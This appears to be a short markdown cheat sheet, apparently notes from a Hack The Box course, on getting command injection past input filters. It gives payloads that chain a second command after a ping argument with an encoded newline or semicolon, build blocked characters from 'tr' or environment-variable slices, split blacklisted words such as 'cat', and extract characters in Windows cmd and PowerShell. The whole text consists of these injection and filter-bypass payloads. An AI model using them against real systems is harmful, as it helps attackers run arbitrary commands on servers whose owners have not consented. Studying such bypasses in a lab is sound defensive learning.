### Use new-line instead of ; or &
#### Example: 
```bash
ping 0.0.0.0%0als
```
The `%0a` is an encodded `\n` that will execute the ls command afterwards

<hr>

### Use tabs instead of spaces (bypass spaces blacklist)
```bash
ping 0.0.0.0;ls  -l
```

<hr>

### Bypass some characters
#### Shift the character
```bash
echo $(tr '!-}' '"-~'<<<[) # this will result in \
```
#### Extract the character from a env variable
```bash
$(echo	${PATH:0:1})
```
#### words blacklist
```
ca$(echo "t") # cat
```

<hr>

### Cool commands
```bash
print # instead of echo
printenv # print all env variables
```

<hr>

### WINDOWS ?

```cmd
C:\htb> echo %HOMEPATH:~6,-11%  # will result in \
PS C:\htb> $env:HOMEPATH[0] # will result in \
PS C:\htb> $env:PROGRAMFILES[10]
```
